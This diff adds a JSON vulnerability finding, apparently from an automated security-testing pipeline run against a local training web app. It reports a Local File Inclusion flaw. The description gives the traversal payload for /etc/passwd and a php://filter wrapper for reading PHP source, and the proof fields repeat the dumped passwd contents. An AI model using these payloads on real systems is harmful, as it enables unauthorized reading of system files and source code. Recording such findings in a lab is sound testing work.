@@ -1,0 +1,28 @@
+{
+  "id": "f_1784861882945_097d34",
+  "action": "confirm",
+  "title": "Local File Inclusion (LFI) in /vulnerabilities/fi/",
+  "severity": "high",
+  "finding_kind": "vuln",
+  "location": "http://127.0.0.1:8080/vulnerabilities/fi/",
+  "url": "http://127.0.0.1:8080/vulnerabilities/fi/",
+  "description": "The page parameter accepts path traversal. Using page=../../../../etc/passwd reads system files. Also supports php://filter/convert.base64-encode/resource=file.php to read PHP source code.",
+  "poc": "Probe request against http://127.0.0.1:8080/vulnerabilities/fi/; observed proving result from prior stage handoff: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/",
+  "proof": "root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false",
+  "how_captured": "script: proof_lfi.txt",
+  "evidence_ids": [
+    "ev_1784861882135_a296ca"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784861882135_a296ca",
+      "excerpt": "root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "script: proof_lfi.txt"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "8080",
+  "created_at": "2026-07-24T02:58:02.945Z"
+}
